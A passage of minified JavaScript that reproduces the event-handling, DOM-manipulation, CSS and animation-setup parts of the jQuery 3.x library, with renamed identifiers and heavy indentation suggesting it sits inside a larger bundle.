                                    return f = "undefined" != typeof e.getElementsByTagName ? e.getElementsByTagName(d || "*") : "undefined" != typeof e.querySelectorAll ? e.querySelectorAll(d || "*") : [], void 0 === d || d && bv.nodeName(e, d) ? bv.merge([e], f) : f
                                }

                                function cu(f, e) {
                                    for (var h = 0, g = f.length; h < g; h++) {
                                        bZ.set(f[h], "globalEval", !e || bZ.get(e[h], "globalEval"))
                                    }
                                }
                                var bU = /<|&#?\w+;/;

                                function bn(D, C, B, A, z) {
                                    for (var y, x, w, v, u, t, s = C.createDocumentFragment(), r = [], q = 0, p = D.length; q < p; q++) {
                                        if (y = D[q], y || 0 === y) {
                                            if ("object" === bv.type(y)) {
                                                bv.merge(r, y.nodeType ? [y] : y)
                                            } else {
                                                if (bU.test(y)) {
                                                    x = x || s.appendChild(C.createElement("div")), w = (av.exec(y) || ["", ""])[1].toLowerCase(), v = ad[w] || ad._default, x.innerHTML = v[1] + bv.htmlPrefilter(y) + v[2], t = v[0];
                                                    while (t--) {
                                                        x = x.lastChild
                                                    }
                                                    bv.merge(r, x.childNodes), x = s.firstChild, x.textContent = ""
                                                } else {
                                                    r.push(C.createTextNode(y))
                                                }
                                            }
                                        }
                                    }
                                    s.textContent = "", q = 0;
                                    while (y = r[q++]) {
                                        if (A && bv.inArray(y, A) > -1) {
                                            z && z.push(y)
                                        } else {
                                            if (u = bv.contains(y.ownerDocument, y), x = cF(s.appendChild(y), "script"), u && cu(x), B) {
                                                t = 0;
                                                while (y = x[t++]) {
                                                    am.test(y.type || "") && B.push(y)
                                                }
                                            }
                                        }
                                    }
                                    return s
                                }! function() {
                                    var e = bM.createDocumentFragment(),
                                        d = e.appendChild(bM.createElement("div")),
                                        f = bM.createElement("input");
                                    f.setAttribute("type", "radio"), f.setAttribute("checked", "checked"), f.setAttribute("name", "t"), d.appendChild(f), bz.checkClone = d.cloneNode(!0).cloneNode(!0).lastChild.checked, d.innerHTML = "<textarea>x</textarea>", bz.noCloneChecked = !!d.cloneNode(!0).lastChild.defaultValue
                                }();
                                var bf = bM.documentElement,
                                    a6 = /^key/,
                                    aX = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
                                    aP = /^([^.]*)(?:\.(.+)|)/;

                                function aH() {
                                    return !0
                                }

                                function az() {
                                    return !1
                                }

                                function aq() {
                                    try {
                                        return bM.activeElement
                                    } catch (b) {}
                                }

                                function ah(j, i, p, o, n, m) {
                                    var l, k;
                                    if ("object" == typeof i) {
                                        "string" != typeof p && (o = o || p, p = void 0);
                                        for (k in i) {
                                            ah(j, k, p, o, i[k], m)
                                        }
                                        return j
                                    }
                                    if (null == o && null == n ? (n = p, o = p = void 0) : null == n && ("string" == typeof p ? (n = o, o = void 0) : (n = o, o = p, p = void 0)), n === !1) {
                                        n = az
                                    } else {
                                        if (!n) {
                                            return j
                                        }
                                    }
                                    return 1 === m && (l = n, n = function(b) {
                                        return bv().off(b), l.apply(this, arguments)
                                    }, n.guid = l.guid || (l.guid = bv.guid++)), j.each(function() {
                                        bv.event.add(this, i, n, o, p)
                                    })
                                }
                                bv.event = {
                                    global: {},
                                    add: function(H, G, F, E, D) {
                                        var C, B, A, z, y, x, w, v, u, t, s, r = bZ.get(H);
                                        if (r) {
                                            F.handler && (C = F, F = C.handler, D = C.selector), D && bv.find.matchesSelector(bf, D), F.guid || (F.guid = bv.guid++), (z = r.events) || (z = r.events = {}), (B = r.handle) || (B = r.handle = function(a) {
                                                return "undefined" != typeof bv && bv.event.triggered !== a.type ? bv.event.dispatch.apply(H, arguments) : void 0
                                            }), G = (G || "").match(cd) || [""], y = G.length;
                                            while (y--) {
                                                A = aP.exec(G[y]) || [], u = s = A[1], t = (A[2] || "").split(".").sort(), u && (w = bv.event.special[u] || {}, u = (D ? w.delegateType : w.bindType) || u, w = bv.event.special[u] || {}, x = bv.extend({
                                                    type: u,
                                                    origType: s,
                                                    data: E,
                                                    handler: F,
                                                    guid: F.guid,
                                                    selector: D,
                                                    needsContext: D && bv.expr.match.needsContext.test(D),
                                                    namespace: t.join(".")
                                                }, C), (v = z[u]) || (v = z[u] = [], v.delegateCount = 0, w.setup && w.setup.call(H, E, t, B) !== !1 || H.addEventListener && H.addEventListener(u, B)), w.add && (w.add.call(H, x), x.handler.guid || (x.handler.guid = F.guid)), D ? v.splice(v.delegateCount++, 0, x) : v.push(x), bv.event.global[u] = !0)
                                            }
                                        }
                                    },
                                    remove: function(H, G, F, E, D) {
                                        var C, B, A, z, y, x, w, v, u, t, s, r = bZ.hasData(H) && bZ.get(H);
                                        if (r && (z = r.events)) {
                                            G = (G || "").match(cd) || [""], y = G.length;
                                            while (y--) {
                                                if (A = aP.exec(G[y]) || [], u = s = A[1], t = (A[2] || "").split(".").sort(), u) {
                                                    w = bv.event.special[u] || {}, u = (E ? w.delegateType : w.bindType) || u, v = z[u] || [], A = A[2] && new RegExp("(^|\\.)" + t.join("\\.(?:.*\\.|)") + "(\\.|$)"), B = C = v.length;
                                                    while (C--) {
                                                        x = v[C], !D && s !== x.origType || F && F.guid !== x.guid || A && !A.test(x.namespace) || E && E !== x.selector && ("**" !== E || !x.selector) || (v.splice(C, 1), x.selector && v.delegateCount--, w.remove && w.remove.call(H, x))
                                                    }
                                                    B && !v.length && (w.teardown && w.teardown.call(H, t, r.handle) !== !1 || bv.removeEvent(H, u, r.handle), delete z[u])
                                                } else {
                                                    for (u in z) {
                                                        bv.event.remove(H, u + G[y], F, E, !0)
                                                    }
                                                }
                                            }
                                            bv.isEmptyObject(z) && bZ.remove(H, "handle events")
                                        }
                                    },
                                    dispatch: function(v) {
                                        var u = bv.event.fix(v),
                                            t, s, r, q, p, o, n = new Array(arguments.length),
                                            m = (bZ.get(this, "events") || {})[u.type] || [],
                                            l = bv.event.special[u.type] || {};
                                        for (n[0] = u, t = 1; t < arguments.length; t++) {
                                            n[t] = arguments[t]
                                        }
                                        if (u.delegateTarget = this, !l.preDispatch || l.preDispatch.call(this, u) !== !1) {
                                            o = bv.event.handlers.call(this, u, m), t = 0;
                                            while ((q = o[t++]) && !u.isPropagationStopped()) {
                                                u.currentTarget = q.elem, s = 0;
                                                while ((p = q.handlers[s++]) && !u.isImmediatePropagationStopped()) {
                                                    u.rnamespace && !u.rnamespace.test(p.namespace) || (u.handleObj = p, u.data = p.data, r = ((bv.event.special[p.origType] || {}).handle || p.handler).apply(q.elem, n), void 0 !== r && (u.result = r) === !1 && (u.preventDefault(), u.stopPropagation()))
                                                }
                                            }
                                            return l.postDispatch && l.postDispatch.call(this, u), u.result
                                        }
                                    },
                                    handlers: function(t, s) {
                                        var r, q, p, o, n, m = [],
                                            l = s.delegateCount,
                                            k = t.target;
                                        if (l && k.nodeType && !("click" === t.type && t.button >= 1)) {
                                            for (; k !== this; k = k.parentNode || this) {
                                                if (1 === k.nodeType && ("click" !== t.type || k.disabled !== !0)) {
                                                    for (o = [], n = {}, r = 0; r < l; r++) {
                                                        q = s[r], p = q.selector + " ", void 0 === n[p] && (n[p] = q.needsContext ? bv(p, this).index(k) > -1 : bv.find(p, this, null, [k]).length), n[p] && o.push(q)
                                                    }
                                                    o.length && m.push({
                                                        elem: k,
                                                        handlers: o
                                                    })
                                                }
                                            }
                                        }
                                        return k = this, l < s.length && m.push({
                                            elem: k,
                                            handlers: s.slice(l)
                                        }), m
                                    },
                                    addProp: function(d, c) {
                                        Object.defineProperty(bv.Event.prototype, d, {
                                            enumerable: !0,
                                            configurable: !0,
                                            get: bv.isFunction(c) ? function() {
                                                if (this.originalEvent) {
                                                    return c(this.originalEvent)
                                                }
                                            } : function() {
                                                if (this.originalEvent) {
                                                    return this.originalEvent[d]
                                                }
                                            },
                                            set: function(a) {
                                                Object.defineProperty(this, d, {
                                                    enumerable: !0,
                                                    configurable: !0,
                                                    writable: !0,
                                                    value: a
                                                })
                                            }
                                        })
                                    },
                                    fix: function(b) {
                                        return b[bv.expando] ? b : new bv.Event(b)
                                    },
                                    special: {
                                        load: {
                                            noBubble: !0
                                        },
                                        focus: {
                                            trigger: function() {
                                                if (this !== aq() && this.focus) {
                                                    return this.focus(), !1
                                                }
                                            },
                                            delegateType: "focusin"
                                        },
                                        blur: {
                                            trigger: function() {
                                                if (this === aq() && this.blur) {
                                                    return this.blur(), !1
                                                }
                                            },
                                            delegateType: "focusout"
                                        },
                                        click: {
                                            trigger: function() {
                                                if ("checkbox" === this.type && this.click && bv.nodeName(this, "input")) {
                                                    return this.click(), !1
                                                }
                                            },
                                            _default: function(b) {
                                                return bv.nodeName(b.target, "a")
                                            }
                                        },
                                        beforeunload: {
                                            postDispatch: function(b) {
                                                void 0 !== b.result && b.originalEvent && (b.originalEvent.returnValue = b.result)
                                            }
                                        }
                                    }
                                }, bv.removeEvent = function(e, d, f) {
                                    e.removeEventListener && e.removeEventListener(d, f)
                                }, bv.Event = function(d, c) {
                                    return this instanceof bv.Event ? (d && d.type ? (this.originalEvent = d, this.type = d.type, this.isDefaultPrevented = d.defaultPrevented || void 0 === d.defaultPrevented && d.returnValue === !1 ? aH : az, this.target = d.target && 3 === d.target.nodeType ? d.target.parentNode : d.target, this.currentTarget = d.currentTarget, this.relatedTarget = d.relatedTarget) : this.type = d, c && bv.extend(this, c), this.timeStamp = d && d.timeStamp || bv.now(), void(this[bv.expando] = !0)) : new bv.Event(d, c)
                                }, bv.Event.prototype = {
                                    constructor: bv.Event,
                                    isDefaultPrevented: az,
                                    isPropagationStopped: az,
                                    isImmediatePropagationStopped: az,
                                    isSimulated: !1,
                                    preventDefault: function() {
                                        var b = this.originalEvent;
                                        this.isDefaultPrevented = aH, b && !this.isSimulated && b.preventDefault()
                                    },
                                    stopPropagation: function() {
                                        var b = this.originalEvent;
                                        this.isPropagationStopped = aH, b && !this.isSimulated && b.stopPropagation()
                                    },
                                    stopImmediatePropagation: function() {
                                        var b = this.originalEvent;
                                        this.isImmediatePropagationStopped = aH, b && !this.isSimulated && b.stopImmediatePropagation(), this.stopPropagation()
                                    }
                                }, bv.each({
                                    altKey: !0,
                                    bubbles: !0,
                                    cancelable: !0,
                                    changedTouches: !0,
                                    ctrlKey: !0,
                                    detail: !0,
                                    eventPhase: !0,
                                    metaKey: !0,
                                    pageX: !0,
                                    pageY: !0,
                                    shiftKey: !0,
                                    view: !0,
                                    "char": !0,
                                    charCode: !0,
                                    key: !0,
                                    keyCode: !0,
                                    button: !0,
                                    buttons: !0,
                                    clientX: !0,
                                    clientY: !0,
                                    offsetX: !0,
                                    offsetY: !0,
                                    pointerId: !0,
                                    pointerType: !0,
                                    screenX: !0,
                                    screenY: !0,
                                    targetTouches: !0,
                                    toElement: !0,
                                    touches: !0,
                                    which: function(d) {
                                        var c = d.button;
                                        return null == d.which && a6.test(d.type) ? null != d.charCode ? d.charCode : d.keyCode : !d.which && void 0 !== c && aX.test(d.type) ? 1 & c ? 1 : 2 & c ? 3 : 4 & c ? 2 : 0 : d.which
                                    }
                                }, bv.event.addProp), bv.each({
                                    mouseenter: "mouseover",
                                    mouseleave: "mouseout",
                                    pointerenter: "pointerover",
                                    pointerleave: "pointerout"
                                }, function(d, c) {
                                    bv.event.special[d] = {
                                        delegateType: c,
                                        bindType: c,
                                        handle: function(b) {
                                            var j, i = this,
                                                h = b.relatedTarget,
                                                g = b.handleObj;
                                            return h && (h === i || bv.contains(i, h)) || (b.type = g.origType, j = g.handler.apply(this, arguments), b.type = c), j
                                        }
                                    }
                                }), bv.fn.extend({
                                    on: function(f, e, h, g) {
                                        return ah(this, f, e, h, g)
                                    },
                                    one: function(f, e, h, g) {
                                        return ah(this, f, e, h, g, 1)
                                    },
                                    off: function(g, f, j) {
                                        var i, h;
                                        if (g && g.preventDefault && g.handleObj) {
                                            return i = g.handleObj, bv(g.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this
                                        }
                                        if ("object" == typeof g) {
                                            for (h in g) {
                                                this.off(h, f, g[h])
                                            }
                                            return this
                                        }
                                        return f !== !1 && "function" != typeof f || (j = f, f = void 0), j === !1 && (j = az), this.each(function() {
                                            bv.event.remove(this, g, j, f)
                                        })
                                    }
                                });
                                var cJ = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,
                                    cy = /<script|<style|<link/i,
                                    a0 = /checked\s*(?:[^=]|=\s*.checked.)/i,
                                    aR = /^true\/(.*)/,
                                    aJ = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

                                function aB(d, c) {
                                    return bv.nodeName(d, "table") && bv.nodeName(11 !== c.nodeType ? c : c.firstChild, "tr") ? d.getElementsByTagName("tbody")[0] || d : d
                                }

                                function at(b) {
                                    return b.type = (null !== b.getAttribute("type")) + "/" + b.type, b
                                }

                                function ak(d) {
                                    var c = aR.exec(d.type);
                                    return c ? d.type = c[1] : d.removeAttribute("type"), d
                                }

                                function cL(t, s) {
                                    var r, q, p, o, n, m, l, k;
                                    if (1 === s.nodeType) {
                                        if (bZ.hasData(t) && (o = bZ.access(t), n = bZ.set(s, o), k = o.events)) {
                                            delete n.handle, n.events = {};
                                            for (p in k) {
                                                for (r = 0, q = k[p].length; r < q; r++) {
                                                    bv.event.add(s, p, k[p][r])
                                                }
                                            }
                                        }
                                        bY.hasData(t) && (m = bY.access(t), l = bv.extend({}, m), bY.set(s, l))
                                    }
                                }

                                function cD(e, d) {
                                    var f = d.nodeName.toLowerCase();
                                    "input" === f && aD.test(e.type) ? d.checked = e.checked : "input" !== f && "textarea" !== f || (d.defaultValue = e.defaultValue)
                                }

                                function cs(C, B, A, z) {
                                    B = bH.apply([], B);
                                    var y, x, w, v, u, t, r = 0,
                                        p = C.length,
                                        o = p - 1,
                                        g = B[0],
                                        D = bv.isFunction(g);
                                    if (D || p > 1 && "string" == typeof g && !bz.checkClone && a0.test(g)) {
                                        return C.each(function(b) {
                                            var a = C.eq(b);
                                            D && (B[0] = g.call(this, b, a.html())), cs(a, B, A, z)
                                        })
                                    }
                                    if (p && (y = bn(B, C[0].ownerDocument, !1, C, z), x = y.firstChild, 1 === y.childNodes.length && (y = x), x || z)) {
                                        for (w = bv.map(cF(y, "script"), at), v = w.length; r < p; r++) {
                                            u = y, r !== o && (u = bv.clone(u, !0, !0), v && bv.merge(w, cF(u, "script"))), A.call(C[r], u, r)
                                        }
                                        if (v) {
                                            for (t = w[w.length - 1].ownerDocument, bv.map(w, ak), r = 0; r < v; r++) {
                                                u = w[r], am.test(u.type || "") && !bZ.access(u, "globalEval") && bv.contains(t, u) && (u.src ? bv._evalUrl && bv._evalUrl(u.src) : by(u.textContent.replace(aJ, ""), t))
                                            }
                                        }
                                    }
                                    return C
                                }

                                function bS(h, g, l) {
                                    for (var k, j = g ? bv.filter(g, h) : h, i = 0; null != (k = j[i]); i++) {
                                        l || 1 !== k.nodeType || bv.cleanData(cF(k)), k.parentNode && (l && bv.contains(k.ownerDocument, k) && cu(cF(k, "script")), k.parentNode.removeChild(k))
                                    }
                                    return h
                                }
                                bv.extend({
                                    htmlPrefilter: function(b) {
                                        return b.replace(cJ, "<$1></$2>")
                                    },
                                    clone: function(r, q, p) {
                                        var o, n, m, l, k = r.cloneNode(!0),
                                            j = bv.contains(r.ownerDocument, r);
                                        if (!(bz.noCloneChecked || 1 !== r.nodeType && 11 !== r.nodeType || bv.isXMLDoc(r))) {
                                            for (l = cF(k), m = cF(r), o = 0, n = m.length; o < n; o++) {
                                                cD(m[o], l[o])
                                            }
                                        }
                                        if (q) {
                                            if (p) {
                                                for (m = m || cF(r), l = l || cF(k), o = 0, n = m.length; o < n; o++) {
                                                    cL(m[o], l[o])
                                                }
                                            } else {
                                                cL(r, k)
                                            }
                                        }
                                        return l = cF(k, "script"), l.length > 0 && cu(l, !j && cF(r, "script")), k
                                    },
                                    cleanData: function(h) {
                                        for (var g, l, k, j = bv.event.special, i = 0; void 0 !== (l = h[i]); i++) {
                                            if (b1(l)) {
                                                if (g = l[bZ.expando]) {
                                                    if (g.events) {
                                                        for (k in g.events) {
                                                            j[k] ? bv.event.remove(l, k) : bv.removeEvent(l, k, g.handle)
                                                        }
                                                    }
                                                    l[bZ.expando] = void 0
                                                }
                                                l[bY.expando] && (l[bY.expando] = void 0)
                                            }
                                        }
                                    }
                                }), bv.fn.extend({
                                    detach: function(b) {
                                        return bS(this, b, !0)
                                    },
                                    remove: function(b) {
                                        return bS(this, b)
                                    },
                                    text: function(b) {
                                        return b2(this, function(c) {
                                            return void 0 === c ? bv.text(this) : this.empty().each(function() {
                                                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = c)
                                            })
                                        }, null, b, arguments.length)
                                    },
                                    append: function() {
                                        return cs(this, arguments, function(d) {
                                            if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                                                var c = aB(this, d);
                                                c.appendChild(d)
                                            }
                                        })
                                    },
                                    prepend: function() {
                                        return cs(this, arguments, function(d) {
                                            if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                                                var c = aB(this, d);
                                                c.insertBefore(d, c.firstChild)
                                            }
                                        })
                                    },
                                    before: function() {
                                        return cs(this, arguments, function(b) {
                                            this.parentNode && this.parentNode.insertBefore(b, this)
                                        })
                                    },
                                    after: function() {
                                        return cs(this, arguments, function(b) {
                                            this.parentNode && this.parentNode.insertBefore(b, this.nextSibling)
                                        })
                                    },
                                    empty: function() {
                                        for (var d, c = 0; null != (d = this[c]); c++) {
                                            1 === d.nodeType && (bv.cleanData(cF(d, !1)), d.textContent = "")
                                        }
                                        return this
                                    },
                                    clone: function(d, c) {
                                        return d = null != d && d, c = null == c ? d : c, this.map(function() {
                                            return bv.clone(this, d, c)
                                        })
                                    },
                                    html: function(b) {
                                        return b2(this, function(g) {
                                            var f = this[0] || {},
                                                j = 0,
                                                i = this.length;
                                            if (void 0 === g && 1 === f.nodeType) {
                                                return f.innerHTML
                                            }
                                            if ("string" == typeof g && !cy.test(g) && !ad[(av.exec(g) || ["", ""])[1].toLowerCase()]) {
                                                g = bv.htmlPrefilter(g);
                                                try {
                                                    for (; j < i; j++) {
                                                        f = this[j] || {}, 1 === f.nodeType && (bv.cleanData(cF(f, !1)), f.innerHTML = g)
                                                    }
                                                    f = 0
                                                } catch (h) {}
                                            }
                                            f && this.empty().append(g)
                                        }, null, b, arguments.length)
                                    },
                                    replaceWith: function() {
                                        var b = [];
                                        return cs(this, arguments, function(a) {
                                            var d = this.parentNode;
                                            bv.inArray(this, b) < 0 && (bv.cleanData(cF(this)), d && d.replaceChild(a, this))
                                        }, b)
                                    }
                                }), bv.each({
                                    appendTo: "append",
                                    prependTo: "prepend",
                                    insertBefore: "before",
                                    insertAfter: "after",
                                    replaceAll: "replaceWith"
                                }, function(d, c) {
                                    bv.fn[d] = function(b) {
                                        for (var l, k = [], j = bv(b), i = j.length - 1, h = 0; h <= i; h++) {
                                            l = h === i ? this : this.clone(!0), bv(j[h])[c](l), bG.apply(k, l.get())
                                        }
                                        return this.pushStack(k)
                                    }
                                });
                                var bk = /^margin/,
                                    bd = new RegExp("^(" + bQ + ")(?!px)[a-z%]+$", "i"),
                                    a4 = function(a) {
                                        var d = a.ownerDocument.defaultView;
                                        return d && d.opener || (d = bP), d.getComputedStyle(a)
                                    };
                                ! function() {
                                    function a() {
                                        if (d) {
                                            d.style.cssText = "box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%", d.innerHTML = "", bf.appendChild(j);
                                            var c = bP.getComputedStyle(d);
                                            n = "1%" !== c.top, k = "2px" === c.marginLeft, m = "4px" === c.width, d.style.marginRight = "50%", l = "4px" === c.marginRight, bf.removeChild(j), d = null
                                        }
                                    }
                                    var n, m, l, k, j = bM.createElement("div"),
                                        d = bM.createElement("div");
                                    d.style && (d.style.backgroundClip = "content-box", d.cloneNode(!0).style.backgroundClip = "", bz.clearCloneStyle = "content-box" === d.style.backgroundClip, j.style.cssText = "border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute", j.appendChild(d), bv.extend(bz, {
                                        pixelPosition: function() {
                                            return a(), n
                                        },
                                        boxSizingReliable: function() {
                                            return a(), m
                                        },
                                        pixelMarginRight: function() {
                                            return a(), l
                                        },
                                        reliableMarginLeft: function() {
                                            return a(), k
                                        }
                                    }))
                                }();

                                function aV(j, i, p) {
                                    var o, n, m, l, k = j.style;
                                    return p = p || a4(j), p && (l = p.getPropertyValue(i) || p[i], "" !== l || bv.contains(j.ownerDocument, j) || (l = bv.style(j, i)), !bz.pixelMarginRight() && bd.test(l) && bk.test(i) && (o = k.width, n = k.minWidth, m = k.maxWidth, k.minWidth = k.maxWidth = k.width = l, l = p.width, k.width = o, k.minWidth = n, k.maxWidth = m)), void 0 !== l ? l + "" : l
                                }

                                function aN(d, c) {
                                    return {
                                        get: function() {
                                            return d() ? void delete this.get : (this.get = c).apply(this, arguments)
                                        }
                                    }
                                }
                                var aF = /^(none|table(?!-c[ea]).+)/,
                                    ax = {
                                        position: "absolute",
                                        visibility: "hidden",
                                        display: "block"
                                    },
                                    ao = {
                                        letterSpacing: "0",
                                        fontWeight: "400"
                                    },
                                    af = ["Webkit", "Moz", "ms"],
                                    cH = bM.createElement("div").style;

                                function cw(e) {
                                    if (e in cH) {
                                        return e
                                    }
                                    var d = e[0].toUpperCase() + e.slice(1),
                                        f = af.length;
                                    while (f--) {
                                        if (e = af[f] + d, e in cH) {
                                            return e
                                        }
                                    }
                                }

                                function b4(f, e, h) {
                                    var g = cA.exec(e);
                                    return g ? Math.max(0, g[2] - (h || 0)) + (g[3] || "px") : e
                                }

                                function bx(i, h, n, m, l) {
                                    var k, j = 0;
                                    for (k = n === (m ? "border" : "content") ? 4 : "width" === h ? 1 : 0; k < 4; k += 2) {
                                        "margin" === n && (j += bv.css(i, n + cj[k], !0, l)), m ? ("content" === n && (j -= bv.css(i, "padding" + cj[k], !0, l)), "margin" !== n && (j -= bv.css(i, "border" + cj[k] + "Width", !0, l))) : (j += bv.css(i, "padding" + cj[k], !0, l), "padding" !== n && (j += bv.css(i, "border" + cj[k] + "Width", !0, l)))
                                    }
                                    return j
                                }

                                function bg(i, h, n) {
                                    var m, l = !0,
                                        k = a4(i),
                                        j = "border-box" === bv.css(i, "boxSizing", !1, k);
                                    if (i.getClientRects().length && (m = i.getBoundingClientRect()[h]), m <= 0 || null == m) {
                                        if (m = aV(i, h, k), (m < 0 || null == m) && (m = i.style[h]), bd.test(m)) {
                                            return m
                                        }
                                        l = j && (bz.boxSizingReliable() || m === i.style[h]), m = parseFloat(m) || 0
                                    }
                                    return m + bx(i, h, n || (j ? "border" : "content"), l, k) + "px"
                                }
                                bv.extend({
                                    cssHooks: {
                                        opacity: {
                                            get: function(e, d) {
                                                if (d) {
                                                    var f = aV(e, "opacity");
                                                    return "" === f ? "1" : f
                                                }
                                            }
                                        }
                                    },
                                    cssNumber: {
                                        animationIterationCount: !0,
                                        columnCount: !0,
                                        fillOpacity: !0,
                                        flexGrow: !0,
                                        flexShrink: !0,
                                        fontWeight: !0,
                                        lineHeight: !0,
                                        opacity: !0,
                                        order: !0,
                                        orphans: !0,
                                        widows: !0,
                                        zIndex: !0,
                                        zoom: !0
                                    },
                                    cssProps: {
                                        "float": "cssFloat"
                                    },
                                    style: function(r, q, p, o) {
                                        if (r && 3 !== r.nodeType && 8 !== r.nodeType && r.style) {
                                            var n, m, l, k = bv.camelCase(q),
                                                j = r.style;
                                            return q = bv.cssProps[k] || (bv.cssProps[k] = cw(k) || k), l = bv.cssHooks[q] || bv.cssHooks[k], void 0 === p ? l && "get" in l && void 0 !== (n = l.get(r, !1, o)) ? n : j[q] : (m = typeof p, "string" === m && (n = cA.exec(p)) && n[1] && (p = a9(r, q, n), m = "number"), null != p && p === p && ("number" === m && (p += n && n[3] || (bv.cssNumber[k] ? "" : "px")), bz.clearCloneStyle || "" !== p || 0 !== q.indexOf("background") || (j[q] = "inherit"), l && "set" in l && void 0 === (p = l.set(r, p, o)) || (j[q] = p)), void 0)
                                        }
                                    },
                                    css: function(j, i, p, o) {
                                        var n, m, l, k = bv.camelCase(i);
                                        return i = bv.cssProps[k] || (bv.cssProps[k] = cw(k) || k), l = bv.cssHooks[i] || bv.cssHooks[k], l && "get" in l && (n = l.get(j, !0, p)), void 0 === n && (n = aV(j, i, o)), "normal" === n && i in ao && (n = ao[i]), "" === p || p ? (m = parseFloat(n), p === !0 || isFinite(m) ? m || 0 : n) : n
                                    }
                                }), bv.each(["height", "width"], function(d, c) {
                                    bv.cssHooks[c] = {
                                        get: function(b, f, e) {
                                            if (f) {
                                                return !aF.test(bv.css(b, "display")) || b.getClientRects().length && b.getBoundingClientRect().width ? bg(b, c, e) : bi(b, ax, function() {
                                                    return bg(b, c, e)
                                                })
                                            }
                                        },
                                        set: function(b, l, k) {
                                            var j, i = k && a4(b),
                                                h = k && bx(b, c, k, "border-box" === bv.css(b, "boxSizing", !1, i), i);
                                            return h && (j = cA.exec(l)) && "px" !== (j[3] || "px") && (b.style[c] = l, l = bv.css(b, c)), b4(b, l, h)
                                        }
                                    }
                                }), bv.cssHooks.marginLeft = aN(bz.reliableMarginLeft, function(d, c) {
                                    if (c) {
                                        return (parseFloat(aV(d, "marginLeft")) || d.getBoundingClientRect().left - bi(d, {
                                            marginLeft: 0
                                        }, function() {
                                            return d.getBoundingClientRect().left
                                        })) + "px"
                                    }
                                }), bv.each({
                                    margin: "",
                                    padding: "",
                                    border: "Width"
                                }, function(d, c) {
                                    bv.cssHooks[d + c] = {
                                        expand: function(h) {
                                            for (var g = 0, b = {}, a = "string" == typeof h ? h.split(" ") : [h]; g < 4; g++) {
                                                b[d + cj[g] + c] = a[g] || a[g - 2] || a[0]
                                            }
                                            return b
                                        }
                                    }, bk.test(d) || (bv.cssHooks[d + c].set = b4)
                                }), bv.fn.extend({
                                    css: function(d, c) {
                                        return b2(this, function(i, h, n) {
                                            var m, l, k = {},
                                                j = 0;
                                            if (bv.isArray(h)) {
                                                for (m = a4(i), l = h.length; j < l; j++) {
                                                    k[h[j]] = bv.css(i, h[j], !1, m)
                                                }
                                                return k
                                            }
                                            return void 0 !== n ? bv.style(i, h, n) : bv.css(i, h)
                                        }, d, c, arguments.length > 1)
                                    }
                                });

                                function a7(g, f, j, i, h) {
                                    return new a7.prototype.init(g, f, j, i, h)
                                }
                                bv.Tween = a7, a7.prototype = {
                                    constructor: a7,
                                    init: function(h, g, l, k, j, i) {
                                        this.elem = h, this.prop = l, this.easing = j || bv.easing._default, this.options = g, this.start = this.now = this.cur(), this.end = k, this.unit = i || (bv.cssNumber[l] ? "" : "px")
                                    },
                                    cur: function() {
                                        var b = a7.propHooks[this.prop];
                                        return b && b.get ? b.get(this) : a7.propHooks._default.get(this)
                                    },
                                    run: function(e) {
                                        var d, f = a7.propHooks[this.prop];
                                        return this.options.duration ? this.pos = d = bv.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = d = e, this.now = (this.end - this.start) * d + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), f && f.set ? f.set(this) : a7.propHooks._default.set(this), this
                                    }
                                }, a7.prototype.init.prototype = a7.prototype, a7.propHooks = {
                                    _default: {
                                        get: function(d) {
                                            var c;
                                            return 1 !== d.elem.nodeType || null != d.elem[d.prop] && null == d.elem.style[d.prop] ? d.elem[d.prop] : (c = bv.css(d.elem, d.prop, ""), c && "auto" !== c ? c : 0)
                                        },
                                        set: function(b) {
                                            bv.fx.step[b.prop] ? bv.fx.step[b.prop](b) : 1 !== b.elem.nodeType || null == b.elem.style[bv.cssProps[b.prop]] && !bv.cssHooks[b.prop] ? b.elem[b.prop] = b.now : bv.style(b.elem, b.prop, b.now + b.unit)
                                        }
                                    }
                                }, a7.propHooks.scrollTop = a7.propHooks.scrollLeft = {
                                    set: function(b) {
                                        b.elem.nodeType && b.elem.parentNode && (b.elem[b.prop] = b.now)
                                    }
                                }, bv.easing = {
                                    linear: function(b) {
                                        return b
                                    },
                                    swing: function(b) {
                                        return 0.5 - Math.cos(b * Math.PI) / 2
                                    },
                                    _default: "swing"
                                }, bv.fx = a7.prototype.init, bv.fx.step = {};
                                var aY, cq, ai = /^(?:toggle|show|hide)$/,
                                    cz = /queueHooks$/;

                                function ch() {
                                    cq && (bP.requestAnimationFrame(ch), bv.fx.tick())
                                }

                                function bI() {
                                    return bP.setTimeout(function() {
                                        aY = void 0
                                    }), aY = bv.now()
                                }

                                function bh(g, f) {
                                    var j, i = 0,
                                        h = {
                                            height: g
                                        };
                                    for (f = f ? 1 : 0; i < 4; i += 2 - f) {
                                        j = cj[i], h["margin" + j] = h["padding" + j] = g
                                    }
                                    return f && (h.opacity = h.width = g), h
                                }

                                function a8(i, h, n) {
                                    for (var m, l = (aK.tweeners[h] || []).concat(aK.tweeners["*"]), k = 0, j = l.length; k < j; k++) {
                                        if (m = l[k].call(n, h, i)) {
                                            return m
                                        }
                                    }
                                }

                                function a1(H, G, F) {
                                    var E, D, C, B, A, z, y, x, w = "width" in G || "height" in G,
                                        v = this,
                                        u = {},
                                        t = H.style,
                                        s = H.nodeType && bK(H),
                                        r = bZ.get(H, "fxshow");
                                    F.queue || (B = bv._queueHooks(H, "fx"), null == B.unqueued && (B.unqueued = 0, A = B.empty.fire, B.empty.fire = function() {
                                        B.unqueued || A()
                                    }), B.unqueued++, v.always(function() {
                                        v.always(function() {
                                            B.unqueued--, bv.queue(H, "fx").length || B.empty.fire()
                                        })
                                    }));
                                    for (E in G) {
                                        if (D = G[E], ai.test(D)) {
                                            if (delete G[E], C = C || "toggle" === D, D === (s ? "hide" : "show")) {
                                                if ("show" !== D || !r || void 0 === r[E]) {
                                                    continue
                                                }
